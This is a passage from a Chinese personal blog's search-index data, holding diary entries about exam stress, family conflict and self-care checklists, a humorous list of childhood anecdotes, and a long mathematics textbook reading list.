","date":"2025-03-17","objectID":"/2025%E5%B9%B43%E6%9C%88%E7%AC%AC%E4%B8%89%E5%91%A8%E8%AE%B0%E5%BD%95/:2:0","series":["记录"],"tags":null,"title":"2025年3月第三周记录","uri":"/2025%E5%B9%B43%E6%9C%88%E7%AC%AC%E4%B8%89%E5%91%A8%E8%AE%B0%E5%BD%95/#2025-03-18"},{"categories":null,"content":" 3 2025-3-19 昨天晚上感觉情绪特别低落，觉得人特别孤独，觉得整个人特别无助，好像病又犯了。不想那么多了，赶紧把事情做完，做完了就什么都不想了。加油吧！ 昨天运动以后，小腿特别酸胀，今天就不跳操了，做一下帕梅拉腹部训练 我感觉我痛苦是因为我总是拖延，而其实花点时间努力爆肝，事情是总可以完成的，我只是不够努力，而且拖得太久，导致痛苦一直延续。我要努力把事情做完，结束这个痛苦，走向新的人生。 焦虑是没有用的，无论焦虑与否，任务总在那里，你总是要完成它的。焦虑不会改变你的人生，只有完成所有任务可以改变你的人生。 如果你追求完美，那就把事情全部做完，不要去思考其他的退路，不要有其他的想法。既然选择了道路，那就风雨兼程。加油吧！ 吃早饭 ✅ 2025-03-19 洗鼻子 ✅ 2025-03-19 修复格式问题 ✅ 2025-03-19 图片链接尚未修复 ✅ 2025-03-19 这个图片总是要放在static目录下，很烦啊，弄得都腰疼了，还耽误时间 我好累啊，我真的累。啊，想要休息，可是我不可以休息，时间不容许我休息。 整理一下15-213过去的学习笔记和学习记录，继续完成后面的学习 ✅ 2025-03-19 洗个澡 ✅ 2025-03-19 进入电院复试了，加油，奥里给！ 先把图像显示问题解决，然后接下来把学习任务全部完成。 以后一定不要让博客配置这种事情耽误时间，知道吗？ 此外，要谨防腰间盘突出，每隔50分钟要做一套帕梅拉腹部训练； ","date":"2025-03-17","objectID":"/2025%E5%B9%B43%E6%9C%88%E7%AC%AC%E4%B8%89%E5%91%A8%E8%AE%B0%E5%BD%95/:3:0","series":["记录"],"tags":null,"title":"2025年3月第三周记录","uri":"/2025%E5%B9%B43%E6%9C%88%E7%AC%AC%E4%B8%89%E5%91%A8%E8%AE%B0%E5%BD%95/#2025-3-19"},{"categories":null,"content":" 4 2025-3-20 昨天晚上睡前总是在为可能的情况思考和担忧，我感觉过度思考和提前焦虑已经严重影响到我的正常生活了。我觉得我提前焦虑是因为我对自己的能力不太有自信，那么应该提升我的能力，而不是在能力不足的情况下去提前预演那些情况。我过去的提前预演，没有一个是奏效了的，最后事情都没有按照我的提前预演去走。所以应该转化为大量的行动，在行动完成之后稍微的准备一下就可以，而不是在那里空想，导致拖延了行动的时间。昨天晚上睡觉也没睡好，一直做梦，早上起来还头疼。这样下去可不行。正确的做法是白天把能做的事情都做完，晚上舒舒服服睡觉。 加油吧！ 我妈要不要焦虑是她的课题，我焦不焦虑是我的课题。 今天要做到的：除了吃饭出去以外，坚决不打开房门，不让阿黄进来，如果她大喊大叫，就把耳塞带上。 我需要学习如何修炼内心的平静，不在乎外界的干扰。阿黄只是我修炼路上的第一个怪，我需要先通过阿黄这一关。 在学习之前，为了达到内心的平静，我必须把我的情绪问题解决 我烦躁的来源是，我本来复习压力就大，我的母亲却一而再再而三的不停的询问相关的事情，多次冲进我的房间里来拿东西，经常在外面大喊大叫，让我给她做事，喜欢大声说话打电话外放抖音歌曲，并且对自己的行为毫无悔改，总觉得自己也没干什么，但是总觉得我对她态度不好，脾气不好。一旦我对她有愤怒情绪，她就觉得是我情绪太过激动。她甚至在我凶她之后，会为了逼迫我就范，跟我采取冷暴力和其他的极端行为。 我需要认识到的事情是：我的母亲改变不了，她从不认为自己有错，并且她整个人非常不成熟，心智水平和闹情绪的小孩是一个等级。 那么我需要采取的措施是 根本上：不能再对她改变抱有期待，多年以来的实践经历证明她是无法被改变的；也不要再指望和她交流，能说服她； 政策上：QQ将她的消息隐藏会话； 物理上： 锁上房门，没有必要不出门应对她； 如果她外放抖音等，就带上耳塞学习； 如果她要求进入我房间拿东西，坚决不开门； 如果她要求我出去帮她做事，坚决不开门； 心理上： 我需要学习如何调节自己的情绪，学习如何快速恢复平静，学习如何在嘈杂和不太好的状态下做事，寻找到做事的动机； 快速调节情绪的方法： 把事情写下来 4-7-8方法深呼吸 喝水平静 健身，将不满发泄到力量上 一些心理窍门 我发现母亲的行为，只要稍加屏蔽，就无法影响到我，因此从根本上我无需担忧，只要专注做事情就可以； 阿德勒的心理学表明：母亲的行为是母亲的课题，我怎么响应是我的课题，这两种课题是分开的，互不影响的。我觉得母亲烦躁，很大程度上是因为我自己学习学的不好，而母亲在外面吵吵，所以为我不努力学习提供了一个心理上的借口。我应该警惕这种思维陷阱，把注意力专注在我自己的提升上； 要解决对父母的期待，最重要的是，把对父母的依恋的事情一条条的写下来，然后写出解决方案，然后一条条的解决： 依恋：期待父母能照顾自己，有事的时候能求助于父母，能得到父母的安慰 解决方案： 提升各方面的能力，找到工作，独立赚钱。 提升生活自理能力，能够自己做家务，完成家里各个事项； 健身，提升身体素质，不畏惧安全问题； 依恋：期待父母能了解自己、理解自己、支持自己 解决方案： 提升个人能力，社会自然会肯定我，不需要父母的肯定； 做出更多的突出成就，提升自信心，感受到自我的价值，不需要父母的肯定； 多赚钱，提升能力，自己就可以支持自己，还会有很多的家人朋友支持自己，不需要父母的支持； 依恋：期待父母能改变，能变成让人舒服的样子 解决方案： 意识到父母无法改变，所以应该努力脱离他们； 一步步的努力，不要为了当前还处在困境当中而感到不适，应该专注于自己的目标、不懈努力，只有努力才能脱离当前的困境，走向自己的未来； 核心 将遇到事情-抱怨-不满-内耗的模式，转化为遇到事情-思考解决方案-一条条列举todo-做事解决的模式 我做事情的动机 这个星期必须要把第一阶段所有的任务完成，这是重大的任务，这是不容置疑的，必须完成的。我所有的一切都是为了做到这件事，所以只要专注于这件事就可以，不要再考虑其他的任何事情。 精神 学习阿甘精神，专注、认真、坚持，一定会收获好的未来！ 加油吧！姑娘！你一定可以突破重围，成为更好的自己！ 切断心理上对父母的依恋，和对于他们改变自己的期待。这不是冷血和冷漠，是对自己更好的关怀和成长。 ✅ 2025-03-20 专注提升个人能力，去应对各种风险和挑战。 ✅ 2025-03-20 完成研究兴趣爱好综合素质调查 ✅ 2025-03-20 订复试酒店和车票 ✅ 2025-03-20 准备资格审查的材料准备好并上传 ✅ 2025-03-20 Ch3 笔记整理了一半，感觉有点累了。我感觉身体有点发软，脑子有点无力。开始有点学不动了。我的身体提醒，我现在必须休息，我确定我必须休息。 出去走一圈，晒个太阳（20分钟） ✅ 2025-03-20 晒太阳太舒服了，我真的好喜欢晒太阳！ 好好睡一觉，猛猛睡一觉 ✅ 2025-03-20 每天要进行必要的休息，但是切记不可以变成摆烂。要持续的努力完成任务，把自己的人生当成一款RPG游戏，加大有游戏通关的力度。 应该把任务切分成更小的单元，这样可以提高成就感。 要防止压力增加，消耗血清素。 打水，喝点水，平复一下心情，降低一下压力 ✅ 2025-03-20 我的内心有点不太平静，有些压力，我需要排解一下再回来继续我的工作 ✅ 2025-03-20 当个乐观的人，别做悲观的人。面对所有困难，都要一往无前。很多事情没你想像的那么难。 无论这书读不读，下面这些事情都得做完，所以根本的目标应该是把它们做完，而不是在那里想来想去，人应该想尽一切办法去把这些事情完成，而不是感叹压力。 我该如何训练自己：刻意去寻找挑战，寻找困难，寻找挫折，寻找刺激。在过程中一步步的挑战自己的极限，发掘自己的潜力，提升心理韧性和自我效能感，而不是一味的逃避恐惧，懦弱害怕。 不行，我花了太多时间在无用的事情和给自己做心理建设上了，我没有花时间去完成真正的任务，所以我才这么焦虑。这不应该。 本星期的目标就是把下面todo中的任务全部完成，虽然任务量庞大，但是我相信自己可以做到。一旦迈过了这个坎，就没有什么事情能阻挡得了我了。 ","date":"2025-03-17","objectID":"/2025%E5%B9%B43%E6%9C%88%E7%AC%AC%E4%B8%89%E5%91%A8%E8%AE%B0%E5%BD%95/:4:0","series":["记录"],"tags":null,"title":"2025年3月第三周记录","uri":"/2025%E5%B9%B43%E6%9C%88%E7%AC%AC%E4%B8%89%E5%91%A8%E8%AE%B0%E5%BD%95/#2025-3-20"},{"categories":null,"content":" 5 2025-3-21 至 2025-3-23 不把任务全部完成，我就不休息。 完蛋，一到中午这个时候就开始身体发热发汗了，和昨天一样。 电脑卡住了，卡住了。 我感觉我的思路不对，我总是想着猛猛干。但是我忽略了休息。我不知道休息的重要性，我总想再用意志力坚持一会儿，但是这是反人类的，在不舒服的状态下继续坚持是反人类的。 身体再好点就好了，能像健康人一样精力旺盛，活力四射。我好想做到这样。 我真的干不动了，我肚子很胀，我的身体软软的，我的头晕晕乎乎，我很不舒服，我需要休息，我需要休息，不然我扛不住了。我需要下楼走路，我扛不住了。 ✅ 2025-03-21 下去晒晒太阳 ✅ 2025-03-21 我要睡觉，睡到彻底舒服了就起来猛猛干 ✅ 2025-03-21 吃肠胃药，好好拉个屎 ✅ 2025-03-21 把鼻子洗了 ✅ 2025-03-21 洗个头洗个澡 ✅ 2025-03-21 把床单衣物都换洗晒了 ✅ 2025-03-21 把其他杂事全做个干净，然后来继续大力学习 ✅ 2025-03-21 编译优化和处理器优化真的难啊，我感觉自己是弱智啊（我真的适合学系统方向吗，我都开始怀疑我自己了QAQ） 身体扛不住了，必须睡觉了，头已经开始疼了 既然想要搞系统方向的研究，就必须拿出克服困难的勇气来。遇到一点点难题就觉得受不了，就不想思考，就不想动，那你凭什么告诉别人你想要搞系统方向。你连自己的一点点任务都做不到，你拿什么向别人保证能做到他们给你布置的任务？你要攀登高峰，就要忍受痛苦，孤独，险阻。你要做成事情，就要get your hands dirty，否则就不要出发。你要达到比别人更高的境界，你就要付出更多的努力。你要证明你比别人聪明，就得更高效的完成任务。从明天早上起，不要抱怨了，也不要害怕了，一件件事情做完。先把要做的事情列出来，然后再去集中精力高效的完成它们。事情不是一把就做到完美的，重点是高效的思考，每件事情、每个困难尽量在5分钟内解决掉。如果能在5分钟内解决掉，就把时间缩短到1分钟。时间就像海绵里的水，只要愿意挤，总会是有的。你想想你做平板支撑，2分钟那么长，所以时间是完全够用的。就看你怎么把握了。既然有完美主义，就逼着自己把事情全部做完。不要放松，不要懈怠，不要给自己找借口找理由。把困难的部分拆解为小目标，每个小目标在极短时间内完成。聚少成多，大目标就可以顺利完成了。 行李清单搞出来 ✅ 2025-03-21 昨天晚上睡得不好，我总结下来有如下几点 要养成早睡早起的规律作息，身体是一切革命的本钱 做事情不要犹豫，不要纠结，把要做的事情列出来后立即行动 遇到困难拆分成小的步骤，然后逐个解决，拿掉你的恐惧 永远对自己有自信，人是没有极限的 把思考放在学习上，而不是放在提前忧虑、思考和预演一些事情上，不要内耗，不要提前焦虑 睡觉就睡觉，学习就学习，专注于当下 遇到困难应该是解决问题，而不是逃避问题。既然定下了搞系统方向的目标，就要竭尽全力去完成所有任务，不要放松懈怠，不要认为可以偷工减料。遇到困难就解决困难，事情办成以后你会发现很多事情也不过如此 立即改变为上述行为，而不要再因为金牛座的固执而保留之前的行为了。阿德勒心理学说明了，人是可以立即改变的，很多时候改变不了不是因为外部环境，而是因为我们固执的不愿意改变，保留着过去的行为，这些隐性的旧有思维阻挡着我们成为新的人。因此只要思维换新，人是可以立即改变的。 大部分行李准备完成 ✅ 2025-03-22 旅行基本物品 ✅ 2025-03-22 复试相关资料 ✅ 2025-03-22 复试材料准备完成 ✅ 2025-03-22 星期六早上准备好大部分行李 ✅ 2025-03-22 警报，注意力涣散，需要休息！需要休息！ ✅ 2025-03-22 感觉人睡不着，出去走2圈，晒晒太阳 ✅ 2025-03-22 舒舒服服睡个午觉 ✅ 2025-03-22 睡觉就猛猛睡，不要考虑其他任何事情，不要思索过去，也不要思索未来，不要考虑时间。做个没心没肺的人。 把该完成的事情都完成掉，你就对得起你自己。而不是指望大力投入时间，搞疲劳战术。精力充沛的全神贯注冲刺1小时，比拖着慢慢吞吞3小时，效率来的高得多。 几个阶段的任务全部完成了以后，你的人生是可以保证一定会大放异彩的。但是不要疲劳战术，只要在清醒的时候认真把任务全部完成，你就对得起你自己。 星期六晚上买好早餐食物，并把所有行李准备完成 ✅ 2025-03-22 复习相关书籍带上 ✅ 2025-03-22 晚上10点睡觉 ✅ 2025-03-23 星期天早上6点起床 ✅ 2025-03-23 6点半出发，起来后直接出发； ✅ 2025-03-23 星期天抵达后在酒店寄存行李 ✅ 2025-03-23 复试需要准备的项目列出来 ✅ 2025-03-23 机试（数据结构与算法训练） ✅ 2025-03-23 英语口语（雅思类似口语训练） ✅ 2025-03-23 专业课（专业技能训练） ✅ 2025-03-23 然后回到酒店继续进行复习准备 ✅ 2025-03-23 不行，要把窗帘拉上再好好睡一觉，不然身体扛不住 ✅ 2025-03-23 独立收拾行李，独立出一次远门 ✅ 2025-03-23 独立解决旅行中的各种问题 ✅ 2025-03-23 ","date":"2025-03-17","objectID":"/2025%E5%B9%B43%E6%9C%88%E7%AC%AC%E4%B8%89%E5%91%A8%E8%AE%B0%E5%BD%95/:5:0","series":["记录"],"tags":null,"title":"2025年3月第三周记录","uri":"/2025%E5%B9%B43%E6%9C%88%E7%AC%AC%E4%B8%89%E5%91%A8%E8%AE%B0%E5%BD%95/#2025-3-21-至-2025-3-23"},{"categories":null,"content":" 睡一觉先 ✅ 2025-05-06 洗头洗澡； ✅ 2025-05-06 叫学院那些老师逼到绝路上了，实在是难绷。这下真得靠自己的努力实现人生改变了，否则就得一直看这些人的脸色，活得不痛快； 我觉得很愤怒，霸凌这个叫，纯纯的欺负人； 以后要加倍努力，做事情要做到极致； 通过这次事情学习了经验 能力不足没人要； 精神内耗没有用； 面子这玩意不重要，端着也没必要； 要乐观面对人生的起起落落，持续进步，达到人生目标； 遇到难过的事情可以破防，但是别破防太久，还有路要赶； 去医院看指甲； ✅ 2025-05-06 因为手指包扎了，没法写代码； 下楼走两圈，平复一下心情； ✅ 2025-05-06 去医院换药； ✅ 2025-05-07 把行李收拾一下，衣服洗了； ✅ 2025-05-07 把钱转给诗诗微微； ✅ 2025-05-08 下楼走两圈，恢复体力和活力； ✅ 2025-05-08 搞清楚接下来需要搭建哪几个网站 ✅ 2025-05-08 计算机专业刷课排行榜； 计算机专业一站式指导手册 把书籍推荐网改造成计算机专业一站式指导手册，先把框架搭起来，在后续不断地完善该手册的内容； ✅ 2025-05-08 可以确定下来的事情 必须彻底逃离垃圾父母，从心理上切断愧疚 必须彻底切断对过去的念想 必须真正开始实现个人独立 把往后的每日安排和作息规定好 ✅ 2025-05-11 例假量太大了，我需要休息，好好的休息，好好晒太阳，充分释放自己。等待恢复了之后， 再进行其他安排； 晚上10点睡觉，早上6点起床，起床后健身1个半小时，到7点半，然后开始完成所有任务 12号开始努力，到18号完成所有任务，一周内搞定所有事情，加油 总结：本周因为手指脓肿切开引了流，进行了包扎，以及来了例假，整体效率不高，下周开始闭关修炼。 ","date":"2025-01-24","objectID":"/2025%E5%B9%B45%E6%9C%88%E7%AC%AC%E4%BA%8C%E5%91%A8%E8%AE%B0%E5%BD%95/:0:0","series":["记录"],"tags":null,"title":"2025年5月第二周记录","uri":"/2025%E5%B9%B45%E6%9C%88%E7%AC%AC%E4%BA%8C%E5%91%A8%E8%AE%B0%E5%BD%95/#"},{"categories":null,"content":"本人过去二十年抽象行为集锦","date":"2025-01-24","objectID":"/%E6%88%91%E7%9A%84%E6%8A%BD%E8%B1%A1%E4%BA%BA%E7%94%9F/","series":["记录"],"tags":["抽象"],"title":"我的抽象人生","uri":"/%E6%88%91%E7%9A%84%E6%8A%BD%E8%B1%A1%E4%BA%BA%E7%94%9F/"},{"categories":null,"content":"今天在和超理群友聊天之时，发现自己过往抽象行为众多。下面进行一个汇总，以供娱乐。 ","date":"2025-01-24","objectID":"/%E6%88%91%E7%9A%84%E6%8A%BD%E8%B1%A1%E4%BA%BA%E7%94%9F/:0:0","series":["记录"],"tags":["抽象"],"title":"我的抽象人生","uri":"/%E6%88%91%E7%9A%84%E6%8A%BD%E8%B1%A1%E4%BA%BA%E7%94%9F/#"},{"categories":null,"content":" 1 幼儿园时期 幼儿园胖老师让小朋友们准备一条毛巾去学校。因为不知道毛巾带多大的，我带了一条浴巾，并且骄傲的向老师展示，喜提一通骂。 上学迟到了，没有做早操，于是老实的站在教室中间等待老师回来，并且大声向老师报告自己没有做早操，喜提一通骂。 因为认为妈妈给我穿的紧身外裤不算裤子，于是崩溃大哭，并且在别人问我为什么哭的时候，告诉别人是因为我没有穿裤子，遭遇他人的疑惑眼神。 幼儿园胖老师让小朋友们带一只中性笔去学校，以便上课研究。我带了笔，并且为了向老师展示我对笔的研究颇有兴趣，当着老师的面把那支笔给拆了。喜提一通骂，并且老师要求我当场把笔装回去。因为不知道弹簧装在哪里，当场急哭。 因为惧怕幼儿园胖老师，经常不敢去上厕所，导致拉屎拉在裤子里。 在画画时将近处的人物画的小，将远处的人物画的大。近处的人物站在地上，远处的人物飞在天上。但是没画地平线，画出来的效果喜人。遭到小朋友们嘲笑，但是有一位温柔贴心的大姐姐老师让其他小朋友不要笑话我，并且为我补上了地平线。 ","date":"2025-01-24","objectID":"/%E6%88%91%E7%9A%84%E6%8A%BD%E8%B1%A1%E4%BA%BA%E7%94%9F/:1:0","series":["记录"],"tags":["抽象"],"title":"我的抽象人生","uri":"/%E6%88%91%E7%9A%84%E6%8A%BD%E8%B1%A1%E4%BA%BA%E7%94%9F/#幼儿园时期"},{"categories":null,"content":" 2 小学时期 一年级时期不知道买东西吃是要花钱的。有一次看到同学在一个小卖部门口跟小卖部老板说了什么，老板就给了他吃的。于是我也跑过去，老板问我要什么，我说我要跟他一样的。老板让我给钱，我说我没有钱。老板说没钱你来干什么。 一年级上英语课时，老师考察单词的含义，我在老师提问时，把书打开向老师展示单词在书的这里，喜提一通骂。 二年级时期因为沉迷偷菜，拿着妈妈的号把列表偷了个遍。因为羡慕大家都有尊贵的红土地，我只有普通土地，因此我经常使用一键偷菜金手套进行作业，并且在一键偷菜后使用一键放虫，对他人菜地进行偷袭（我已经严肃的悔过了我的问题，对他人的菜地进行放虫行为是不对的）有天晚上班主任找上我，使用审讯一般的语气，严肃的问我是不是打了游戏。我大为惊讶，我偷菜的事情竟然被她知道了。班主任而后又问我是不是在游戏里花了钱，我想起来确实是在游戏里花钱买了看门狗和狗粮，于是本着诚实的原则，我告诉她确实花了钱。班主任认定我是个网瘾少女，花了一个多小时对我进行严肃的思想教育，并且让我保证再也不打游戏。第二天语文课被她点起来读《竹里馆》，因为把\"明月来相照\"读成了\"明月来照相\"，班主任勃然大怒，告诉大家要是当网瘾少女就会变成我这个样子。 二年级学习拉丁舞，结果因为肢体不柔美，被人吐槽跳舞像僵尸，从此拒绝舞蹈节目。 二年级看同学们都上了奥数班，我也跟着报了奥数班。但是课后作业一题也做不出来，并且不能理解牛为什么一定要一边吃草一边拉，水池为什么要一边抽水一边排。期末考试拼尽全力才59分，同学悠然自得97，遂对数学产生了蜜汁恐惧。 二年级因为不会盲打，在信息课和同学进行金山打字生死时速竞赛时屡屡被人捉拿。母亲遂教我盲打，习得盲打技能后，回校在信息课上到处找人打生死时速，练的一手好手速。四年级被老师选中参加盲打比赛，被田忌赛马虐成狗。 四年级在母亲的带领下逃了期中考试，去了海南旅游七天，回学校后喜提课上罚站。 四年级因为使用电脑以及玩暴力摩托，再次被班主任当成网瘾少女，称我屡教不改。开团体大会称禁止在打暴力游戏，禁止在游戏里充钱。 因为经常在校门口偷吃路边摊，被班干部举报，因此被班主任捉拿。因为班主任多次让我们\"犯事\"的同学做相关的小报，但是美术水平堪忧，发现用word中的文本框做起来非常省事。于是习得了用word做小报的好本领，半个小时能用word做出一张小报。 四年级班主任对我的评语就是会打游戏，爱找人说话，人较为诚实。 五年级时特别喜欢找人聊天，但是他们每次和我聊天以后就告发我，说我到处找人说话，因此本人非常郁闷。 ","date":"2025-01-24","objectID":"/%E6%88%91%E7%9A%84%E6%8A%BD%E8%B1%A1%E4%BA%BA%E7%94%9F/:2:0","series":["记录"],"tags":["抽象"],"title":"我的抽象人生","uri":"/%E6%88%91%E7%9A%84%E6%8A%BD%E8%B1%A1%E4%BA%BA%E7%94%9F/#小学时期"},{"categories":null,"content":" 3 中学时期 在电视上看到播放张国荣恐怖片片段，里面有一个女生在叫，我非常害怕，于是为了避免恐惧，我就叫的比那个女生声音还大，惊扰了我正在浴室快乐洗浴的老娘，老娘骂骂咧咧的出来给我换了台，遂停止尖叫。 喜欢在观看恐怖片段时播放费玉清的《一剪梅》作为配乐，来减少恐惧。 因和同学在语文课上讨论呼伦贝尔大草原的虫子，老师认为我俩的关系过于亲密，因此把我俩调开了。 因为看了《破冰行动》，觉得任达华演的外线很帅，妈妈说我净喜欢老男人，教导我以后找对象，别给她找个老头回来。看了《头号玩家》，觉得头号玩家的男主帅，结果好朋友说头号玩家的男主是他见过最丑的男主。我觉得帅的无一例外都被说长得丑。 ","date":"2025-01-24","objectID":"/%E6%88%91%E7%9A%84%E6%8A%BD%E8%B1%A1%E4%BA%BA%E7%94%9F/:3:0","series":["记录"],"tags":["抽象"],"title":"我的抽象人生","uri":"/%E6%88%91%E7%9A%84%E6%8A%BD%E8%B1%A1%E4%BA%BA%E7%94%9F/#中学时期"},{"categories":null,"content":" 4 大学时期 因为个性较为独立，走路速度较快，拒绝参加奇葩集体活动。班干部们在大会上严肃的讨论了我的问题，称我走路速度过快，同学们都追不上我，因此难以和我亲近。 因为拒绝班干部提出的站着早读英语，于是带了一本同济大学《高等数学》大声朗读。 因为本科不让带电脑，经常偷偷背着巨大的背包到图书馆找犄角旮瘩的地方学计算机，在同学问起包为什么鼓起这么大时，只能说用功读书。 在英语课编排小品时准备预设一个送孩子上学的妈妈，但是对话写的是我需要问别人孩子学校在哪，遭到了英语老师无情的嘲笑。 在照片都没看过的情况下，网恋一个重庆大学学长一年，结果被人突然拉黑，在连续的邮件追问下，学长绷不住了，告知我他有个几年的女朋友，我成了小丑了。 因为时常在背着电脑在教学楼找空教室自习，被同学当成背着电脑包在教学楼随机游走的怪人。室友经常好奇我会找什么样的男朋友，要求我如果找了男朋友，一定要给她看看。 ","date":"2025-01-24","objectID":"/%E6%88%91%E7%9A%84%E6%8A%BD%E8%B1%A1%E4%BA%BA%E7%94%9F/:4:0","series":["记录"],"tags":["抽象"],"title":"我的抽象人生","uri":"/%E6%88%91%E7%9A%84%E6%8A%BD%E8%B1%A1%E4%BA%BA%E7%94%9F/#大学时期"},{"categories":["数学"],"content":"记录我从数学分析开始的刷书记录","date":"2025-01-23","objectID":"/math-journey/","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/"},{"categories":["数学"],"content":" 于是余有叹焉。古人之观于天地、山川、草木、虫鱼、鸟兽，往往有得，以其求思之深而无不在也。夫夷以近，则游者众；险以远，则至者少。而世之奇伟、瑰怪，非常之观，常在于险远，而人之所罕至焉，故非有志者不能至也。有志矣，不随以止也，然力不足者，亦不能至也。有志与力，而又不随以怠，至于幽暗昏惑而无物以相之，亦不能至也。然力足以至焉，于人为可讥，而在己为有悔；尽吾志也而不能至者，可以无悔矣，其孰能讥之乎？此余之所得也！—— （宋）王安石《游褒禅山记》 ","date":"2025-01-23","objectID":"/math-journey/:0:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#"},{"categories":["数学"],"content":" 1 数学分析 Book of proof ✅ 2025-01-23 《陶哲轩实分析》 普林斯顿数学分析读本 Rudin 数学分析原理 哈代纯数学教程 菲赫金哥尔茨《微积分学教程》 吉米多维奇习题集 卓里奇《数学分析》 裴里文《数学分析中的典型问题与方法》 apostol Calculus apostol《数学分析》 龚昇《简明微积分》 小平邦彦《微积分入门》 高木贞治《数学分析概论》 张筑生《数学分析新讲》 辛钦《数学分析八讲》 辛钦《数学分析简明教程》 A Course of Pure Mathematics by G. H. Hardy 科朗《微积分和数学分析引论》 P.D.Lax 的《微积分及其应用》和《多元微积分及其应用》 Spivak 微积分 Calculus: One-variable calculus, with an introduction to linear algebra（apostol卷1） Calculus: Multi-variable calculus and linear algebra, with applications to differential equations and probability（apostol卷2）（学完以后线代、常微分方程和概率论都过了一遍了） Loomis 高等微积分 Understanding Real Analysis Abbott Elementary Analysis: The Theory of Calculus (Undergraduate Texts in Mathematics): Ross, Kenneth A.: 9781441928115: Amazon.com: Books Multidimensional Real Analysis I (豆瓣) (douban.com) Princeton Lectures in Analysis (douban.com) Problems in Mathematical Analysis (Pure and Applied Mathematics) 数学分析基础浅导 (豆瓣) (douban.com) A Course of Modern Analysis (Cambridge Mathematical Library) (豆瓣) (douban.com) A Course in Mathematical Analysis Volume 2 (豆瓣) (douban.com) Mathematical Analysis Apostol 《Mathematical Analysis》 Spivak 数学分析 《数学分析教程》常庚哲史济怀 卓里奇《数学分析》 数学分析中的问题与反例 汪林 《数学分析概论（岩波定本） (豆瓣) (douban.com)）》高木贞治 高等微积分（第 3 版修订版） (豆瓣) (douban.com) 微分学 (豆瓣) (douban.com) Analysis I (豆瓣) (douban.com) Analysis II (豆瓣) (douban.com) Analysis III (豆瓣) (douban.com) [Mathematical Analysis (豆瓣) (douban.com)](https://book.douban.com/subject/1459633/ 法国 Dieudonne 现代分析基础 清华实验班于品分析讲义 Roger Godement 分析 I Roger Godement 分析 II 阿黑波夫《数学分析讲义》 James R. Munkres 《Analysis on Manifolds (豆瓣) (douban.com)》 Spivak 《流形上的微积分》 Manfredo Do Carmo 《曲线与曲面上的微分几何》 Б. А. 杜布洛文 / С. П. 诺维可夫 / А. Т. 福明柯 《现代几何学：方法与应用（第三卷） (豆瓣) (douban.com)》 微分几何基础 (豆瓣) (douban.com) 现代几何学方法和应用 (豆瓣) (douban.com) 高等微积分 (豆瓣) (douban.com) 陈天权《数学分析讲义》 华罗庚《高等数学引论》 Elementary Real Analysis -Brain B. Thomson, Judith B. Bruckner, Andrew M. Bruckner Elementary Analysis 2nd (豆瓣) (douban.com) Real Analysis (豆瓣) (douban.com) Mathematical Analysis - Andrew Browder Second Year Calculus (豆瓣) (douban.com) Foundations of Analysis (豆瓣) (douban.com) 实分析 (豆瓣) (douban.com) Stein 分析 serge lang 的 undergraduate analysis 胡适耕\u003c数学分析原理与方法\u003e Patrick Fitzpatrick advanced calculus Basic Analysis 1-5 by James Peterson Introduction to Analysis (豆瓣) (douban.com) 谢慧民周民强徐森林 习题集 Introduction to Analysis (豆瓣) (douban.com) Tom M. Apostol—Mathematical Analysis 2e Wilfred Kaplan—Advanced Calculus Michael Spivak—Calculus, 4e Dieudonne《无穷小计算》 Dieudonne《现代分析基础》 Real Analysis Jay Cummings Problems and Theorems in Analysis II (豆瓣) (douban.com) Elementary Analysis 2nd (豆瓣) (douban.com) 曲线与曲面的微分几何 (豆瓣) (douban.com) 实分析 (豆瓣) (douban.com) Real Mathematical Analysis (豆瓣) (douban.com) The Way of Analysis (豆瓣) (douban.com) 《数学分析基础浅导》 Yet Another Introduction to Analysis - Bryant (1990) William R. Wade - Introduction to Analysis (2004) Robert G. Bartle - The Elements of Real Analysis, Second Edition (1976) Real Mathematical Analysis by Charles Chapman Pugh (2002) 齐民友《重温微积分》 梅加强《数学分析》 刘玉琏、傅沛仁《数学分析讲义》 伍胜健数学分析 简明数学分析 (豆瓣) (douban.com) 徐森林《数学分析》 崔尚斌《数学分析》 裴礼文《数学分析中的典型问题与方法》刷完 林源渠《数学分析习题集》 周民强《数学分析习题集》 徐森林《数学分析习题精解》 姚正安《数学分析方法论》 波利亚《数学分析中的问题和定理》 伯克利数学问题集（第 3 版） (豆瓣) (douban.com) Problems and Theorems in Analysis II (豆瓣) (douban.com) 谢慧民习题集 ","date":"2025-01-23","objectID":"/math-journey/:1:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#数学分析"},{"categories":["数学"],"content":" 2 常微分方程","date":"2025-01-23","objectID":"/math-journey/:2:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#常微分方程"},{"categories":["数学"],"content":" 3 概率论与数理统计 MIT 《概率导论》 卯诗松《概率论与数理统计》+习题完成 陈希孺《概率论与数理统计》 Statistical inference ","date":"2025-01-23","objectID":"/math-journey/:3:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#概率论与数理统计"},{"categories":["数学"],"content":" 4 线性代数","date":"2025-01-23","objectID":"/math-journey/:4:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#线性代数"},{"categories":["数学"],"content":" 5 高等代数 丘维生《高等代数》+习题指导 蓝以中《高等代数简明教程》 Linear Algebra done right Linear algebra done wrong ","date":"2025-01-23","objectID":"/math-journey/:5:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#高等代数"},{"categories":["数学"],"content":" 6 抽象代数 dummit abstract algebra ","date":"2025-01-23","objectID":"/math-journey/:6:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#抽象代数"},{"categories":["数学"],"content":" 7 代数学 Artin《代数》 科斯特利金《代数学引论》 ","date":"2025-01-23","objectID":"/math-journey/:7:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#代数学"},{"categories":["数学"],"content":" 8 数理逻辑","date":"2025-01-23","objectID":"/math-journey/:8:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#数理逻辑"},{"categories":["数学"],"content":" 9 拓扑学 Murkes 拓扑学 ","date":"2025-01-23","objectID":"/math-journey/:9:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#拓扑学"},{"categories":["数学"],"content":" 10 组合数学","date":"2025-01-23","objectID":"/math-journey/:10:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#组合数学"},{"categories":["数学"],"content":" 11 